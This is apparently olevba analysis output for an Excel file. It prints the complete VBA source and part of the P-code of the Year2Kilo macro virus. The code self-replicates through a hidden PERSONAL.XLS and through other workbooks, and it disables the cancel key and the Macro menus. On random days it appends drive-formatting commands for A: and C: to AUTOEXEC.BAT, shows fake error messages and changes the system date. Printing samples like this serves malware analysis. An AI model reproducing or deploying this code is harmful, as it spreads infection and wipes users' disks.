olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Kilo.xls
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Year2Kilo.bas 
in file: Virus.MSExcel.Kilo.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Year2Kilo'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

' *****************************************************************
' VirusName:Year2Kilo Virus [Y2K-SP],Only Excel
' Origin   : HONGKONG
' Created  : January 22, 1998
' *****************************************************************
Sub Auto_Open()
Attribute Auto_Open.VB_ProcData.VB_Invoke_Func = " \n14"
Application.OnSheetActivate = "Infect"
End Sub
Sub Infect()
Attribute Infect.VB_ProcData.VB_Invoke_Func = " \n14"
On Error GoTo ErrorHandler
If Application.UserName = "RedDone" And Application.OrganizationName = "VirusTime" Then GoTo ErrorHandler
Application.ScreenUpdating = False
Application.DisplayAlerts = False
ThisWorkbook.Saved = True
Application.EnableCancelKey = xlDisabled
Installed = 0
If ThisWorkbook.Name <> "PERSONAL.XLS" Then
If Dir(Application.StartupPath + "\PERSONAL.XLS") = "PERSONAL.XLS" Then Installed = 1
If Installed = 1 Then
GoTo ErrorHandler
Else
Workbooks.Add.SaveAs Filename:=Application.StartupPath + "\PERSONAL.XLS"
Workbooks(ThisWorkbook.Name).Sheets("Year2Kilo").Copy Before:=Workbooks("PERSONAL.XLS").Sheets(1)
Workbooks("PERSONAL.XLS").Sheets("Year2Kilo").Visible = False
Workbooks("PERSONAL.XLS").Save
Windows("PERSONAL.XLS").Visible = False
End If
Else
Windows("PERSONAL.XLS").Visible = False
For I = 1 To Workbooks(ActiveWorkbook.Name).Sheets.Count
If Workbooks(ActiveWorkbook.Name).Sheets(I).Name = "Year2Kilo" Then Installed = 1
Next
If Installed = 1 Then
GoTo ErrorHandler
Else
Workbooks("PERSONAL.XLS").Sheets("Year2Kilo").Copy Before:=Workbooks(ActiveWorkbook.Name).Sheets(1)
Workbooks(ActiveWorkbook.Name).Sheets("Year2Kilo").Visible = False
Workbooks(ActiveWorkbook.Name).Save
Windows("PERSONAL.XLS").Visible = False
End If
End If
Workbooks("PERSONAL.XLS").Save
Application.Caption = "MicroSofa excel"
If Year(Now()) > 1999 Then
Dim fd As String, Fname As String
Randomize
MyValu = Int(((256 - 1) * Rnd) + 1)
fd = "\"
Fname = "BOOK" & MyValu & ".XLS"
ActiveWorkbook.SaveAs Filename:=fd & Fname
End If
Randomize
If Day(Now()) = Int((31 * Rnd) + 1) Then
Open "\AUTOEXEC.BAT" For Append As #1
Print #1, "@echo off"
Print #1, "cls"
Print #1, "echo The FLOPPY disk of A drive is being formatted.  "
Print #1, "echo During initialization   "
Print #1, "echo. "
Print #1, "echo y | \windows\command\format a: /u /q"
Print #1, "echo."
Print #1, "echo."
Print #1, "echo The HARD disk of C drive is being formatted.  "
Print #1, "echo During initialization   "
Print #1, "echo Year2Kilo Virus "
Print #1, "echo."
Print #1, "echo y | \windows\command\format c: /u /q"
Print #1, "echo."
Print #1, "echo Your disk it destroyed that being able to permit, that you do "
Print #1, "echo not do a the practice does not go a the macro virus measure."
Close #1
End If
If Day(Now()) = Int((31 * Rnd) + 1) Then
On Error Resume Next
Error 17
MsgBox Error(Err())
u = Int(((60 - 1) * Rnd) + 1)
newHour = Hour(Now())
newMinute = Minute(Now())
newSecond = Second(Now()) + u
waitTime = TimeSerial(newHour, newMinute, newSecond)
Application.Wait waitTime
Error 61
MsgBox Error(Err())
u = Int(((60 - 1) * Rnd) + 1)
newHour = Hour(Now())
newMinute = Minute(Now())
newSecond = Second(Now()) + u
waitTime = TimeSerial(newHour, newMinute, newSecond)
Application.Wait waitTime
Error 7
MsgBox Error(Err())
u = Int(((60 - 1) * Rnd) + 1)
newHour = Hour(Now())
newMinute = Minute(Now())
newSecond = Second(Now()) + u
waitTime = TimeSerial(newHour, newMinute, newSecond)
Application.Wait waitTime
Error 453
MsgBox Error(Err())
u = Int(((60 - 1) * Rnd) + 1)
newHour = Hour(Now())
newMinute = Minute(Now())
newSecond = Second(Now()) + u
waitTime = TimeSerial(newHour, newMinute, newSecond)
Application.Wait waitTime
Error 28
MsgBox Error(Err())
u = Int(((60 - 1) * Rnd) + 1)
newHour = Hour(Now())
newMinute = Minute(Now())
newSecond = Second(Now()) + u
waitTime = TimeSerial(newHour, newMinute, newSecond)
Application.Wait waitTime
Error 7
MsgBox Error(Err())
u = Int(((60 - 1) * Rnd) + 1)
newHour = Hour(Now())
newMinute = Minute(Now())
newSecond = Second(Now()) + u
waitTime = TimeSerial(newHour, newMinute, newSecond)
Application.Wait waitTime
Error 57
MsgBox Error(Err())
u = Int(((60 - 1) * Rnd) + 1)
newHour = Hour(Now())
newMinute = Minute(Now())
newSecond = Second(Now()) + u
waitTime = TimeSerial(newHour, newMinute, newSecond)
Application.Wait waitTime
Error 447
u = Int(((60 - 1) * Rnd) + 1)
MsgBox Error(Err())
newHour = Hour(Now())
newMinute = Minute(Now())
newSecond = Second(Now()) + u
waitTime = TimeSerial(newHour, newMinute, newSecond)
Application.Wait waitTime
Error 11
MsgBox Error(Err())
Application.Quit
End If
If Day(Now()) = 29 And Month(Now()) = 2 And Year(Now()) = 2000 Then
dyd = Day(1)
mhm = Month(3)
mydate = 2000 & "/" & mhm & "/" & dyd
Date = mydatem
MsgBox "February 29, 2000 does not exist and please do the adjustment in the date and time.", vbCritical, "It is the serious error of Windows."
On Error Resume Next
Error 17
MsgBox Error(Err())
Error 61
MsgBox Error(Err())
Application.Wait "17:00:00"
Application.Quit
End If
Randomize
If Year(Now()) > 1999 Then
With MenuBars(xlWorksheet)
.Menus(1).Enabled = True
.Menus(2).Enabled = False
.Menus(3).Enabled = False
.Menus(4).Enabled = False
.Menus(5).Enabled = False
.Menus(6).Enabled = False
.Menus(7).Enabled = False
.Menus(8).Enabled = False
.Menus(9).Enabled = False
End With
Toolbars(3).Visible = True
Toolbars(4).Visible = True
Toolbars(5).Visible = True
Toolbars(6).Visible = True
Toolbars(7).Visible = True
Application.DisplayFormulaBar = False
Application.DisplayStatusBar = False
With Application
.ShowToolTips = False
.LargeButtons = True
.ColorButtons = False
End With
Randomize
MyValuet = Int(((300 - 10) * Rnd) + 10)
ActiveWindow.Zoom = MyValuet
MyValuete = Int(((200 - 16) * Rnd) + 16)
Application.SheetsInNewWorkbook = MyValuete
Application.MoveAfterReturn = False
Application.MoveAfterReturnDirection = xlUp
Application.DisplayRecentFiles = False
Application.UserName = "Year2KiloVirus[Y2K-SP]"
Application.StandardFont = "Wide Latin"
Application.StandardFontSize = "36"
dy = Day(1)
mh = Month(1)
mydate = 1980 & "/" & mh & "/" & dy
Date = mydate
On Error Resume Next
End If
Application.ScreenUpdating = True
Application.DisplayAlerts = True
With MenuBars(xlNoDocuments)
.Menus(1).Enabled = False
.Menus(2).Enabled = False
End With
With MenuBars(xlInfo)
.Menus(1).Enabled = False
.Menus(2).Enabled = False
.Menus(3).Enabled = False
.Menus(4).Enabled = False
.Menus(5).Enabled = False
End With
With MenuBars(xlChart)
.Menus(1).Enabled = False
.Menus(2).Enabled = False
.Menus(3).Enabled = False
.Menus(4).Enabled = False
.Menus(5).Enabled = False
.Menus(6).Enabled = False
.Menus(7).Enabled = False
.Menus(8).Enabled = False
End With
On Error Resume Next
MenuBars(xlWorksheet).Menus("Tools").MenuItems("&Macro...").Delete
MenuBars(xlModule).Menus("Tools").MenuItems("&Macro...").Delete
MenuBars(xlNoDocuments).Menus("Tools").MenuItems("&Macro...").Delete
MenuBars(xlInfo).Menus("Tools").MenuItems("&Macro...").Delete
MenuBars(xlChart).Menus("Tools").MenuItems("&Macro...").Delete
'//// japanese only ///////////////////////////////////////////////////
MenuBars(xlWorksheet).Menus("Â°Ù").MenuItems("&Ï¸Û...").Delete   '/////
'//////////////////////////////////////////////////////////////////////
End
ErrorHandler:
End Sub





-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     17 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  Year2Kil
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSExcel.Kilo.xls
' ===============================================================================
' Module streams:
' _VBA_PROJECT_CUR/VBA/Year2Kilo - 12290 bytes
' Line #0:
' Line #1:
' 	QuoteRem 0x0000 0x0042 " *****************************************************************"
' Line #2:
' 	QuoteRem 0x0000 0x002E " VirusName:Year2Kilo Virus [Y2K-SP],Only Excel"
' Line #3:
' 	QuoteRem 0x0000 0x0014 " Origin   : HONGKONG"
' Line #4:
' 	QuoteRem 0x0000 0x001C " Created  : January 22, 1998"
' Line #5:
' 	QuoteRem 0x0000 0x0042 " *****************************************************************"
' Line #6:
' 	FuncDefn (Sub Auto_Open())
' Line #7:
' 	LitStr 0x0006 "Infect"
' 	Ld Application 
' 	MemSt OnSheetActivate 
' Line #8:
' 	EndSub 
' Line #9:
' 	FuncDefn (Sub Infect())
' Line #10:
' 	OnError ErrorHandler 
' Line #11:
' 	Ld Application 
' 	MemLd UserName 
' 	LitStr 0x0007 "RedDone"
' 	Eq 
' 	Ld Application 
' 	MemLd OrganizationName 
' 	LitStr 0x0009 "VirusTime"
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo ErrorHandler 
' 	EndIf 
' Line #12:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #13:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #14:
' 	LitVarSpecial (True)
' 	Ld ThisWorkbook 
' 	MemSt Saved 
' Line #15:
' 	Ld xlDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #16:
' 	LitDI2 0x0000 
' 	St Installed 
' Line #17:
' 	Ld ThisWorkbook 
' 	MemLd New 
' 	LitStr 0x000C "PERSONAL.XLS"
' 	Ne 
' 	IfBlock 
' Line #18:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x000D "\PERSONAL.XLS"
' 	Add 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x000C "PERSONAL.XLS"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Installed 
' 	EndIf 
' Line #19:
' 	Ld Installed 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #20:
' 	GoTo ErrorHandler 
' Line #21:
' 	ElseBlock 
' Line #22:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x000D "\PERSONAL.XLS"
' 	Add 
' 	ParamNamed Filename 
' 	Ld Workbooks 
' 	MemLd Add 
' 	ArgsMemCall SaveAs 0x0001 
' Line #23:
' 	LitDI2 0x0001 
' 	LitStr 0x000C "PERSONAL.XLS"
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemLd Sheets 0x0001 
' 	ParamNamed Before 
' 	LitStr 0x0009 "Year2Kilo"
' 	Ld ThisWorkbook 
' 	MemLd New 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemLd Sheets 0x0001 
' 	ArgsMemCall Copy 0x0001 
' Line #24:
' 	LitVarSpecial (False)
' 	LitStr 0x0009 "Year2Kilo"
' 	LitStr 0x000C "PERSONAL.XLS"
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemLd Sheets 0x0001 
' 	MemSt Visible 
' Line #25:
' 	LitStr 0x000C "PERSONAL.XLS"
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall Save 0x0000 
' Line #26:
' 	LitVarSpecial (False)
' 	LitStr 0x000C "PERSONAL.XLS"
' 	ArgsLd Windows 0x0001 
' 	MemSt Visible 
' Line #27:
' 	EndIfBlock 
' Line #28:
' 	ElseBlock 
' Line #29:
' 	LitVarSpecial (False)
' 	LitStr 0x000C "PERSONAL.XLS"
' 	ArgsLd Windows 0x0001 
' 	MemSt Visible 
' Line #30:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveWorkbook 
' 	MemLd New 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd Sheets 
' 	MemLd Count 
' 	For 
' Line #31:
' 	Ld I 
' 	Ld ActiveWorkbook 
' 	MemLd New 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemLd Sheets 0x0001 
' 	MemLd New 
' 	LitStr 0x0009 "Year2Kilo"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Installed 
' 	EndIf 
' Line #32:
' 	StartForVariable 
' 	Next 
' Line #33:
' 	Ld Installed 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #34:
' 	GoTo ErrorHandler 
' Line #35:
' 	ElseBlock 
' Line #36:
' 	LitDI2 0x0001 
' 	Ld ActiveWorkbook 
' 	MemLd New 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemLd Sheets 0x0001 
' 	ParamNamed Before 
' 	LitStr 0x0009 "Year2Kilo"
' 	LitStr 0x000C "PERSONAL.XLS"
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemLd Sheets 0x0001 
' 	ArgsMemCall Copy 0x0001 
' Line #37:
' 	LitVarSpecial (False)
' 	LitStr 0x0009 "Year2Kilo"
' 	Ld ActiveWorkbook 
' 	MemLd New 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemLd Sheets 0x0001 
' 	MemSt Visible 
' Line #38:
' 	Ld ActiveWorkbook 
' 	MemLd New 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall Save 0x0000 
' Line #39:
' 	LitVarSpecial (False)
' 	LitStr 0x000C "PERSONAL.XLS"
' 	ArgsLd Windows 0x0001 
' 	MemSt Visible 
' Line #40:
' 	EndIfBlock 
' Line #41:
' 	EndIfBlock 
' Line #42:
' 	LitStr 0x000C "PERSONAL.XLS"
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall Save 0x0000 
' Line #43:
' 	LitStr 0x000F "MicroSofa excel"
' 	Ld Application 
' 	MemSt Caption 
' Line #44:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Year 0x0001 
' 	LitDI2 0x07CF 
' 	Gt 
' 	IfBlock 
' Line #45:
' 	Dim 
' 	VarDefn fd (As String)
' 	VarDefn Fname (As String)
' Line #46:
' 	ArgsCall Read 0x0000 
' Line #47:
' 	LitDI2 0x0100 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St MyValu 
' Line #48:
' 	LitStr 0x0001 "\"
' 	St fd 
' Line #49:
' 	LitStr 0x0004 "BOOK"
' 	Ld MyValu 
' 	Concat 
' 	LitStr 0x0004 ".XLS"
' 	Concat 
' 	St Fname 
' Line #50:
' 	Ld fd 
' 	Ld Fname 
' 	Concat 
' 	ParamNamed Filename 
' 	Ld ActiveWorkbook 
' 	ArgsMemCall SaveAs 0x0001 
' Line #51:
' 	EndIfBlock 
' Line #52:
' 	ArgsCall Read 0x0000 
' Line #53:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x001F 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	Eq 
' 	IfBlock 
' Line #54:
' 	LitStr 0x000D "\AUTOEXEC.BAT"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #55:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "@echo off"
' 	PrintItemNL 
' Line #56:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0003 "cls"
' 	PrintItemNL 
' Line #57:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0035 "echo The FLOPPY disk of A drive is being formatted.  "
' 	PrintItemNL 
' Line #58:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001D "echo During initialization   "
' 	PrintItemNL 
' Line #59:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "echo. "
' 	PrintItemNL 
' Line #60:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0029 "echo y | \windows\command\format a: /u /q"
' 	PrintItemNL 
' Line #61:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "echo."
' 	PrintItemNL 
' Line #62:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "echo."
' 	PrintItemNL 
' Line #63:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0033 "echo The HARD disk of C drive is being formatted.  "
' 	PrintItemNL 
' Line #64:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001D "echo During initialization   "
' 	PrintItemNL 
' Line #65:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0015 "echo Year2Kilo Virus "
' 	PrintItemNL 
' Line #66:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "echo."
' 	PrintItemNL 
' Line #67:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0029 "echo y | \windows\command\format c: /u /q"
' 	PrintItemNL 
' Line #68:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "echo."
' 	PrintItemNL 
' Line #69:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0043 "echo Your disk it destroyed that being able to permit, that you do "
' 	PrintItemNL 
' Line #70:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0041 "echo not do a the practice does not go a the macro virus measure."
' 	PrintItemNL 
' Line #71:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #72:
' 	EndIfBlock 
' Line #73:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x001F 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	Eq 
' 	IfBlock 
' Line #74:
' 	OnError (Resume Next) 
' Line #75:
' 	LitDI2 0x0011 
' 	Error 
' Line #76:
' 	ArgsLd Err 0x0000 
' 	ArgsLd Error 0x0001 
' 	ArgsCall MsgBox 0x0001 
' Line #77:
' 	LitDI2 0x003C 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St u 
' Line #78:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Hour 0x0001 
' 	St newHour 
' Line #79:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Minute 0x0001 
' 	St newMinute 
' Line #80:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Second 0x0001 
' 	Ld u 
' 	Add 
' 	St newSecond 
' Line #81:
' 	Ld newHour 
' 	Ld newMinute 
' 	Ld newSecond 
' 	ArgsLd TimeSerial 0x0003 
' 	St waitTime 
' Line #82:
' 	Ld waitTime 
' 	Ld Application 
' 	ArgsMemCall Wait 0x0001 
' Line #83:
' 	LitDI2 0x003D 
' 	Error 
' Line #84:
' 	ArgsLd Err 0x0000 
' 	ArgsLd Error 0x0001 
' 	ArgsCall MsgBox 0x0001 
' Line #85:
' 	LitDI2 0x003C 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St u 
' Line #86:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Hour 0x0001 
' 	St newHour 
' Line #87:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Minute 0x0001 
' 	St newMinute 
' Line #88:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Second 0x0001 
' 	Ld u 
' 	Add 
' 	St newSecond 
' Line #89:
' 	Ld newHour 
' 	Ld newMinute 
' 	Ld newSecond 
' 	ArgsLd TimeSerial 0x0003 
' 	St waitTime 
' Line #90:
' 	Ld waitTime 
' 	Ld Application 
' 	ArgsMemCall Wait 0x0001 
' Line #91:
' 	LitDI2 0x0007 
' 	Error 
' Line #92:
' 	ArgsLd Err 0x0000 
' 	ArgsLd Error 0x0001 
' 	ArgsCall MsgBox 0x0001 
' Line #93:
' 	LitDI2 0x003C 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St u 
' Line #94:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Hour 0x0001 
' 	St newHour 
' Line #95:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Minute 0x0001 
' 	St newMinute 
' Line #96:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Second 0x0001 
' 	Ld u 
' 	Add 
' 	St newSecond 
' Line #97:
' 	Ld newHour 
' 	Ld newMinute 
' 	Ld newSecond 
' 	ArgsLd TimeSerial 0x0003 
' 	St waitTime 
' Line #98:
' 	Ld waitTime 
' 	Ld Application 
' 	ArgsMemCall Wait 0x0001 
' Line #99:
' 	LitDI2 0x01C5 
' 	Error 
' Line #100:
' 	ArgsLd Err 0x0000 
' 	ArgsLd Error 0x0001 
' 	ArgsCall MsgBox 0x0001 
' Line #101:
' 	LitDI2 0x003C 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St u 
' Line #102:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Hour 0x0001 
' 	St newHour 
' Line #103:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Minute 0x0001 
' 	St newMinute 
' Line #104:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Second 0x0001 
' 	Ld u 
' 	Add 
' 	St newSecond 
' Line #105:
' 	Ld newHour 
' 	Ld newMinute 
' 	Ld newSecond 
' 	ArgsLd TimeSerial 0x0003 
' 	St waitTime 
' Line #106:
' 	Ld waitTime 
' 	Ld Application 
' 	ArgsMemCall Wait 0x0001 
' Line #107:
' 	LitDI2 0x001C 
' 	Error 
' Line #108:
' 	ArgsLd Err 0x0000 
' 	ArgsLd Error 0x0001 
' 	ArgsCall MsgBox 0x0001 
' Line #109:
' 	LitDI2 0x003C 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St u 
' Line #110:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Hour 0x0001 
' 	St newHour 
' Line #111:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Minute 0x0001 
' 	St newMinute 
' Line #112:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Second 0x0001 
' 	Ld u 
' 	Add 
' 	St newSecond 
' Line #113:
' 	Ld newHour 
' 	Ld newMinute 
' 	Ld newSecond 
' 	ArgsLd TimeSerial 0x0003 
' 	St waitTime 
' Line #114:
' 	Ld waitTime 
' 	Ld Application 
' 	ArgsMemCall Wait 0x0001 
' Line #115:
' 	LitDI2 0x0007 
' 	Error 
' Line #116:
' 	ArgsLd Err 0x0000 
' 	ArgsLd Error 0x0001 
' 	ArgsCall MsgBox 0x0001 
' Line #117:
' 	LitDI2 0x003C 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St u 
' Line #118:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Hour 0x0001 
' 	St newHour 
' Line #119:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Minute 0x0001 
' 	St newMinute 
' Line #120:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Second 0x0001 
' 	Ld u 
' 	Add 
' 	St newSecond 
' Line #121:
' 	Ld newHour 
' 	Ld newMinute 
' 	Ld newSecond 
' 	ArgsLd TimeSerial 0x0003 
' 	St waitTime 
' Line #122:
' 	Ld waitTime 
' 	Ld Application 
' 	ArgsMemCall Wait 0x0001 
' Line #123:
' 	LitDI2 0x0039 
' 	Error 
' Line #124:
' 	ArgsLd Err 0x0000 
' 	ArgsLd Error 0x0001 
' 	ArgsCall MsgBox 0x0001 
' Line #125:
' 	LitDI2 0x003C 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St u 
' Line #126:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Hour 0x0001 
' 	St newHour 
' Line #127:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Minute 0x0001 
' 	St newMinute 
' Line #128:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Second 0x0001 
' 	Ld u 
' 	Add 
' 	St newSecond 
' Line #129:
' 	Ld newHour 
' 	Ld newMinute 
' 	Ld newSecond 
' 	ArgsLd TimeSerial 0x0003 
' 	St waitTime 
' Line #130:
' 	Ld waitTime 
' 	Ld Application 
' 	ArgsMemCall Wait 0x0001 
' Line #131:
' 	LitDI2 0x01BF 
' 	Error 
' Line #132:
' 	LitDI2 0x003C 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St u 
' Line #133:
' 	ArgsLd Err 0x0000 
' 	ArgsLd Error 0x0001 
' 	ArgsCall MsgBox 0x0001 
' Line #134:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Hour 0x0001 
' 	St newHour 
' Line #135:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Minute 0x0001 
' 	St newMinute 
' Line #136:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Second 0x0001 
' 	Ld u 
' 	Add 
' 	St newSecond 
' Line #137:
' 	Ld newHour 
' 	Ld newMinute 
' 	Ld newSecond 
' 	ArgsLd TimeSerial 0x0003 
' 	St waitTime 
' Line #138:
' 	Ld waitTime 
' 	Ld Application 
' 	ArgsMemCall Wait 0x0001 
' Line #139:
' 	LitDI2 0x000B 
' 	Error 
' Line #140:
' 	ArgsLd Err 0x0000 
' 	ArgsLd Error 0x0001 
' 	ArgsCall MsgBox 0x0001 
' Line #141:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #142:
' 	EndIfBlock 
' Line #143:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x001D 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0002 
' 	Eq 
' 	And 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Year 0x0001 
' 	LitDI2 0x07D0 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #144:
' 	LitDI2 0x0001 
' 	ArgsLd Day 0x0001 
' 	St dyd 
' Line #145:
' 	LitDI2 0x0003 
' 	ArgsLd Month 0x0001 
' 	St mhm 
' Line #146:
' 	LitDI2 0x07D0 
' 	LitStr 0x0001 "/"
' 	Concat 
' 	Ld mhm 
' 	Concat 
' 	LitStr 0x0001 "/"
' 	Concat 
' 	Ld dyd 
' 	Concat 
' 	St mydate 
' Line #147:
' 	Ld mydatem 
' 	St Date 
' Line #148:
' 	LitStr 0x0053 "February 29, 2000 does not exist and please do the adjustment in the date and time."
' 	Ld vbCritical 
' 	LitStr 0x0023 "It is the serious error of Windows."
' 	ArgsCall MsgBox 0x0003 
' Line #149:
' 	OnError (Resume Next) 
' Line #150:
' 	LitDI2 0x0011 
' 	Error 
' Line #151:
' 	ArgsLd Err 0x0000 
' 	ArgsLd Error 0x0001 
' 	ArgsCall MsgBox 0x0001 
' Line #152:
' 	LitDI2 0x003D 
' 	Error 
' Line #153:
' 	ArgsLd Err 0x0000 
' 	ArgsLd Error 0x0001 
' 	ArgsCall MsgBox 0x0001 
' Line #154:
' 	LitStr 0x0008 "17:00:00"
' 	Ld Application 
' 	ArgsMemCall Wait 0x0001 
' Line #155:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #156:
' 	EndIfBlock 
' Line #157:
' 	ArgsCall Read 0x0000 
' Line #158:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Year 0x0001 
' 	LitDI2 0x07CF 
' 	Gt 
' 	IfBlock 
' Line #159:
' 	StartWithExpr 
' 	Ld xlWorksheet 
' 	ArgsLd MenuBars 0x0001 
' 	With 
' Line #160:
' 	LitVarSpecial (True)
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Menus 0x0001 
' 	MemSt Enabled 
' Line #161:
' 	LitVarSpecial (False)
' 	LitDI2 0x0002 
' 	ArgsMemLdWith Menus 0x0001 
